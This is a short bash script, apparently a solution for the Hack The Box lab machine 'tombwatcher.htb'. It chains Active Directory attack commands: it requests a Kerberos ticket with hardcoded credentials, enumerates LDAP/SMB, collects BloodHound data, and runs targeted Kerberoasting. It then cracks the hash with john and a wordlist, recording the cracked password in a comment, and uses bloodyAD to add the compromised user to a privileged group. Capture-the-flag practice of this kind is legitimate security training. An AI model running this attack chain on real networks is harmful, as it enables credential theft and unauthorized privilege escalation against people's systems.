```bash

#!/bin/bash

USER="henry"
PASS='H3nry_987TGV!'
HOST="tombwatcher.htb"

timedatectl set-ntp off
ntpdate "$HOST"

impacket-getTGT "$HOST"/"$USER":"$PASS"
export KRB5CCNAME="$(pwd)/$USER.ccache"

nxc ldap "$HOST" -u "$USER" -p "$PASS" -k
nxc smb "$HOST" -u "$USER" -p "$PASS" -k

bloodhound-python -u "$USER" -p "$PASS" -k -ns "$HOST" -c All -d "$HOST" --zip

netexec smb "$HOST" -u "$USER" -p "$PASS" -k --shares --smb-timeout 500

pushd targetedKerberoast-main/
if ! [ -d .venv ]; then
  virtualenv .venv
fi

source .venv/bin/activate && pip install -r requirements.txt
python targetedKerberoast.py -v -d $HOST -u $USER -p "$PASS"

john alfred-hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Alfred:basketball


bloodhound-python -u alfred  -p 'basketball'  -d tombwatcher.htb -ns 10.10.11.72 -c All --zip

bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred


```